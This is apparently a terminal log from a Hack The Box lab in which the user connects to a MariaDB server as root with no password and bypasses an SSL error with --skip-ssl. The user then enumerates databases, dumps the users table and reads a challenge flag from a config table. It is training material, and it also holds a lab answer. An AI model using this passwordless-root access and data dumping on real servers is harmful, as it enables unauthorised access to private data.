──(ajp㉿kali)-[~]
└─$ mysql -h 10.129.95.232 -u root
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
                                                                                                                        
┌──(ajp㉿kali)-[~]
└─$ mysql -h 10.129.95.232 -u root --ssl-mode=disabled
mysql: unknown variable 'ssl-mode=disabled'
                                                                                                                        
┌──(ajp㉿kali)-[~]
└─$ mysql -h 10.129.95.232 -u root --skip-ssl

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 39
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
MariaDB [(none)]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.195 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> describe htb;
ERROR 1146 (42S02): Table 'htb.htb' doesn't exist
MariaDB [htb]> select * from htb;
ERROR 1146 (42S02): Table 'htb.htb' doesn't exist
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.181 sec)

MariaDB [htb]> describe config
    -> ;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
3 rows in set (0.202 sec)

MariaDB [htb]> describe users;
+----------+---------------------+------+-----+---------+----------------+
| Field    | Type                | Null | Key | Default | Extra          |
+----------+---------------------+------+-----+---------+----------------+
| id       | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| username | text                | YES  |     | NULL    |                |
| email    | text                | YES  |     | NULL    |                |
+----------+---------------------+------+-----+---------+----------------+
3 rows in set (0.284 sec)

MariaDB [htb]> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

;
Database changed
MariaDB [mysql]> ;
ERROR: No query specified

MariaDB [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+
31 rows in set (0.205 sec)

MariaDB [mysql]> describe user;
+------------------------+-----------------------------------+------+-----+----------+-------+
| Field                  | Type                              | Null | Key | Default  | Extra |
+------------------------+-----------------------------------+------+-----+----------+-------+
| Host                   | char(60)                          | NO   | PRI |          |       |
| User                   | char(80)                          | NO   | PRI |          |       |
| Password               | char(41)                          | NO   |     |          |       |
| Select_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Insert_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Update_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Delete_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Create_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Drop_priv              | enum('N','Y')                     | NO   |     | N        |       |
| Reload_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Shutdown_priv          | enum('N','Y')                     | NO   |     | N        |       |
| Process_priv           | enum('N','Y')                     | NO   |     | N        |       |
| File_priv              | enum('N','Y')                     | NO   |     | N        |       |
| Grant_priv             | enum('N','Y')                     | NO   |     | N        |       |
| References_priv        | enum('N','Y')                     | NO   |     | N        |       |
| Index_priv             | enum('N','Y')                     | NO   |     | N        |       |
| Alter_priv             | enum('N','Y')                     | NO   |     | N        |       |
| Show_db_priv           | enum('N','Y')                     | NO   |     | N        |       |
| Super_priv             | enum('N','Y')                     | NO   |     | N        |       |
| Create_tmp_table_priv  | enum('N','Y')                     | NO   |     | N        |       |
| Lock_tables_priv       | enum('N','Y')                     | NO   |     | N        |       |
| Execute_priv           | enum('N','Y')                     | NO   |     | N        |       |
| Repl_slave_priv        | enum('N','Y')                     | NO   |     | N        |       |
| Repl_client_priv       | enum('N','Y')                     | NO   |     | N        |       |
| Create_view_priv       | enum('N','Y')                     | NO   |     | N        |       |
| Show_view_priv         | enum('N','Y')                     | NO   |     | N        |       |
| Create_routine_priv    | enum('N','Y')                     | NO   |     | N        |       |
| Alter_routine_priv     | enum('N','Y')                     | NO   |     | N        |       |
| Create_user_priv       | enum('N','Y')                     | NO   |     | N        |       |
| Event_priv             | enum('N','Y')                     | NO   |     | N        |       |
| Trigger_priv           | enum('N','Y')                     | NO   |     | N        |       |
| Create_tablespace_priv | enum('N','Y')                     | NO   |     | N        |       |
| Delete_history_priv    | enum('N','Y')                     | NO   |     | N        |       |
| ssl_type               | enum('','ANY','X509','SPECIFIED') | NO   |     |          |       |
| ssl_cipher             | blob                              | NO   |     | NULL     |       |
| x509_issuer            | blob                              | NO   |     | NULL     |       |
| x509_subject           | blob                              | NO   |     | NULL     |       |
| max_questions          | int(11) unsigned                  | NO   |     | 0        |       |
| max_updates            | int(11) unsigned                  | NO   |     | 0        |       |
| max_connections        | int(11) unsigned                  | NO   |     | 0        |       |
| max_user_connections   | int(11)                           | NO   |     | 0        |       |
| plugin                 | char(64)                          | NO   |     |          |       |
| authentication_string  | text                              | NO   |     | NULL     |       |
| password_expired       | enum('N','Y')                     | NO   |     | N        |       |
| is_role                | enum('N','Y')                     | NO   |     | N        |       |
| default_role           | char(80)                          | NO   |     |          |       |
| max_statement_time     | decimal(12,6)                     | NO   |     | 0.000000 |       |
+------------------------+-----------------------------------+------+-----+----------+-------+
47 rows in set (0.209 sec)

MariaDB [mysql]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.223 sec)

MariaDB [htb]> select * from users
    -> ;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.243 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.287 sec)

MariaDB [htb]> 
                                                                                                                        
                                                                                                                        
                    